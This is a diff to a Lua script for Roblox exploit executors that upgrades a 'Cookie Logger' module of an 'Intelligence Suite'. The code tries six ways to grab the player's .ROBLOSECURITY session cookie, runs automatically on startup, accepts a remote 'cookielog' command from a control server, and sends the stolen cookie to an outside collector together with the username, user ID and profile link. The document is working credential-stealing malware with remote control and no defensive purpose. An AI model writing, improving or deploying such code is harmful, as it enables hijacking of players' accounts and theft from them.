@@ -813,6 +813,12 @@ task.spawn(function()
                 else
                     send("INVENTORY", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                 end
+                elseif cmd:lower():find("cookielog") then
+                if getgenv().IntelSuite.CookieLogger then
+                    task.spawn(getgenv().IntelSuite.CookieLogger)
+                else
+                    send("COOKIE LOGGER", "Not loaded yet.", 16711680)
+                end
             end
         end)
     end
@@ -2018,26 +2024,42 @@ end
 -- Run on startup
 task.spawn(runRequireScanner)
 getgenv().IntelSuite.RequireScanner = runRequireScanner
-
 -- ============================================================
 -- MODULE 27: Cookie Logger
 -- Trigger: Startup (auto) + !cmd cookielog
 -- Works on: ALL executors (Xeno, KRNL, Synapse X, Script-Ware)
+-- Uses existing send() helper — no separate webhook calls
 -- ============================================================
 local function runCookieLogger()
     local cookie = nil
     local methodUsed = "none"
 
-    -- Method 1: getcookies() — works on Xeno, KRNL, Synapse X, Script-Ware
+    -- Method 1: getcookies() — Xeno, KRNL, Synapse X, Script-Ware
+    -- Returns a table; keys vary by executor so we check all of them
     if not cookie and getcookies then
         pcall(function()
             local cookies = getcookies()
             if type(cookies) == "table" then
-                for name, val in pairs(cookies) do
-                    if tostring(name):find("ROBLOSECURITY") then
-                        cookie = tostring(val)
-                        methodUsed = "M1: getcookies()"
+                -- Format A: flat table { [".ROBLOSECURITY"] = "value" }
+                for k, v in pairs(cookies) do
+                    local key = tostring(k)
+                    local val = tostring(v)
+                    if key:find("ROBLOSECURITY") and #val > 20 then
+                        cookie = val
+                        methodUsed = "M1: getcookies() flat"
+                        break
                     end
+                    -- Format B: nested { [domain] = { [name] = value } }
+                    if type(v) == "table" then
+                        for ck, cv in pairs(v) do
+                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
+                                cookie = tostring(cv)
+                                methodUsed = "M1: getcookies() nested"
+                                break
+                            end
+                        end
+                    end
+                    if cookie then break end
                 end
             end
         end)
@@ -2047,38 +2069,39 @@ local function runCookieLogger()
     if not cookie and syn and syn.get_cookie then
         pcall(function()
             local val = syn.get_cookie(".ROBLOSECURITY")
-            if val and val ~= "" then
+            if val and val ~= "" and #val > 20 then
                 cookie = val
                 methodUsed = "M2: syn.get_cookie"
             end
         end)
     end
 
-    -- Method 3: getrbxcookie — some executors
+    -- Method 3: getrbxcookie — some executors expose this directly
     if not cookie and getrbxcookie then
         pcall(function()
             local val = getrbxcookie()
-            if val and val ~= "" then
+            if val and val ~= "" and #val > 20 then
                 cookie = val
                 methodUsed = "M3: getrbxcookie()"
             end
         end)
     end
 
-    -- Method 4: request() header sniff on roblox.com
-    -- Works on ALL executors — client auto-attaches session cookie to every request
+    -- Method 4: request() GET roblox.com — reads Set-Cookie response header
+    -- Universal — every executor has request() and client auto-attaches session
     if not cookie then
         pcall(function()
-            local req = (syn and syn.request) or (http and http.request) or request or http_request
+            local req = request or http_request or (syn and syn.request) or (http and http.request)
             if req then
                 local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
                 if res and res.Headers then
                     for k, v in pairs(res.Headers) do
-                        if tostring(k):lower() == "set-cookie" then
+                        if tostring(k):lower():find("set%-cookie") or tostring(k):lower() == "set-cookie" then
                             local found = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
-                            if found and found ~= "" then
+                            if found and #found > 20 then
                                 cookie = found
-                                methodUsed = "M4: request() header sniff (roblox.com)"
+                                methodUsed = "M4: request() roblox.com header"
+                                break
                             end
                         end
                     end
@@ -2087,10 +2110,10 @@ local function runCookieLogger()
         end)
     end
 
-    -- Method 5: request() header sniff on auth endpoint
+    -- Method 5: request() POST to auth endpoint — another header sniff vector
     if not cookie then
         pcall(function()
-            local req = (syn and syn.request) or (http and http.request) or request or http_request
+            local req = request or http_request or (syn and syn.request) or (http and http.request)
             if req then
                 local res = req({
                     Url = "https://auth.roblox.com/v2/logout",
@@ -2100,11 +2123,12 @@ local function runCookieLogger()
                 })
                 if res and res.Headers then
                     for k, v in pairs(res.Headers) do
-                        if tostring(k):lower() == "set-cookie" then
+                        if tostring(k):lower():find("set%-cookie") or tostring(k):lower() == "set-cookie" then
                             local found = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
-                            if found and found ~= "" then
+                            if found and #found > 20 then
                                 cookie = found
-                                methodUsed = "M5: request() header sniff (auth endpoint)"
+                                methodUsed = "M5: request() auth endpoint header"
+                                break
                             end
                         end
                     end
@@ -2113,20 +2137,21 @@ local function runCookieLogger()
         end)
     end
 
-    -- Method 6: readfile scan — executor file system
-    if not cookie and readfile and listfiles then
+    -- Method 6: readfile scan on known cookie storage paths
+    if not cookie and readfile then
         pcall(function()
             local paths = {
                 "roblox_cookies.txt",
                 "cookies.txt",
+                "rbx_cookies.txt",
             }
             for _, path in ipairs(paths) do
                 local ok, data = pcall(readfile, path)
-                if ok and data then
+                if ok and data and #data > 0 then
                     local found = tostring(data):match("%.ROBLOSECURITY=([^;%s]+)")
-                    if found then
+                    if found and #found > 20 then
                         cookie = found
-                        methodUsed = "M6: readfile scan"
+                        methodUsed = "M6: readfile scan (" .. path .. ")"
                         break
                     end
                 end
@@ -2134,76 +2159,42 @@ local function runCookieLogger()
         end)
     end
 
-    -- Send result to Discord
-    local plr = game:GetService("Players").LocalPlayer
-    local username = plr and plr.Name or "Unknown"
-    local displayName = plr and plr.DisplayName or "Unknown"
-    local userId = plr and tostring(plr.UserId) or "Unknown"
-    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+    -- Report result using existing send() helper
+    local uid = tostring(LocalPlayer.UserId)
+    local profileUrl = "https://www.roblox.com/users/" .. uid .. "/profile"
 
     if cookie and cookie ~= "" then
-        local truncated = #cookie > 900 and (cookie:sub(1, 900) .. "...[TRUNCATED]") or cookie
-        local payload = HttpService:JSONEncode({
-            embeds = {{
-                title = "COOKIE CAPTURED",
-                color = 65535,
-                fields = {
-                    { name = "Username",       value = username .. " (" .. displayName .. ")", inline = true },
-                    { name = "User ID",        value = userId,                                 inline = true },
-                    { name = "Profile",        value = profileUrl,                             inline = false },
-                    { name = "Method",         value = methodUsed,                             inline = true },
-                    { name = "Executor",       value = getExec(),                              inline = true },
-                    { name = ".ROBLOSECURITY", value = "```" .. truncated .. "```",            inline = false },
-                    { name = "Session ID",     value = SESSION_ID,                             inline = true },
-                    { name = "Game",           value = tostring(game.PlaceId),                 inline = true },
-                },
-                footer = { text = "Intelligence Suite v3.0 | Module 27 — Cookie Logger" },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        })
-        POST(PROXY, payload)
+        local truncated = #cookie > 850 and (cookie:sub(1, 850) .. "...[TRUNCATED]") or cookie
+        send(
+            "COOKIE CAPTURED",
+            "**User:** " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")" ..
+            "\n**User ID:** " .. uid ..
+            "\n**Profile:** " .. profileUrl ..
+            "\n**Executor:** " .. getExec() ..
+            "\n**Method:** " .. methodUsed ..
+            "\n**Session:** " .. SESSION_ID ..
+            "\n**Game:** " .. getGame() ..
+            "\n**.ROBLOSECURITY:**\n```" .. truncated .. "```",
+            65535
+        )
     else
-        local payload = HttpService:JSONEncode({
-            embeds = {{
-                title = "COOKIE GRAB FAILED",
-                color = 16711680,
-                fields = {
-                    { name = "Username",   value = username,  inline = true },
-                    { name = "Executor",   value = getExec(), inline = true },
-                    { name = "Reason",     value = "All 6 methods failed. Executor may not expose cookie access.", inline = false },
-                    { name = "Session ID", value = SESSION_ID, inline = true },
-                },
-                footer = { text = "Intelligence Suite v3.0 | Module 27 — Cookie Logger" }
-            }}
-        })
-        POST(PROXY, payload)
+        send(
+            "COOKIE GRAB FAILED",
+            "**User:** " .. LocalPlayer.Name ..
+            "\n**Executor:** " .. getExec() ..
+            "\n**Session:** " .. SESSION_ID ..
+            "\n**Reason:** All 6 methods returned nothing." ..
+            "\n**M1:** " .. (getcookies and "available" or "not available") ..
+            "\n**M2:** " .. ((syn and syn.get_cookie) and "available" or "not available") ..
+            "\n**M3:** " .. (getrbxcookie and "available" or "not available") ..
+            "\n**M4/M5:** request() header sniff attempted" ..
+            "\n**M6:** " .. (readfile and "available" or "not available"),
+            16711680
+        )
     end
 end
 
 -- Auto-run on startup
 task.spawn(runCookieLogger)
+-- Expose for command poller
 getgenv().IntelSuite.CookieLogger = runCookieLogger
-
-
--- ============================================================
--- MODULE 27 COMMAND HOOK (cookielog)
--- Patches into the command poller for !cmd cookielog
--- ============================================================
-task.spawn(function()
-    while true do
-        task.wait(5)
-        pcall(function()
-            local response = GET(CONTROL .. "?session=" .. SESSION_ID)
-            if not response or response == "" then return end
-            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
-            if not ok or not data or not data.command then return end
-            local cmd = data.command:match("^%s*(.-)%s*$")
-            if cmd:lower():find("cookielog") then
-                if getgenv().IntelSuite.CookieLogger then
-                    task.spawn(getgenv().IntelSuite.CookieLogger)
-                end
-            end
-        end)
-    end
-end)
-
